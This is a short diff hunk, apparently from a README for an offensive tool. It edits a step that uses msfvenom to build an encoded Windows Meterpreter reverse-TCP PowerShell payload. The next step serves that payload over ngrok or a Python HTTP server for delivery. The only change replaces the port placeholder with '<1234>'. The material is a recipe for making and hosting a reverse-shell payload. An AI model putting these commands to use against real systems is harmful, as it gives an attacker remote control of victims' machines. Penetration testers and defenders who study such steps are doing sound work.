@@ -8,7 +8,7 @@
 
 1. **Generate the payload:** <br>
 Using meterpreter here, but feel free to play around with it. <br>
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP_ADDRESS> LPORT=<PORT> -i 2 -e cmd/powershell_base64 -f ps1
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP_ADDRESS> LPORT=<1234> -i 2 -e cmd/powershell_base64 -f ps1
 4. **Setup server in files directory:** <br>
 ngrok tcp 80 or python3 -m http.server 80 <br>
 Using ngrok, or python if local
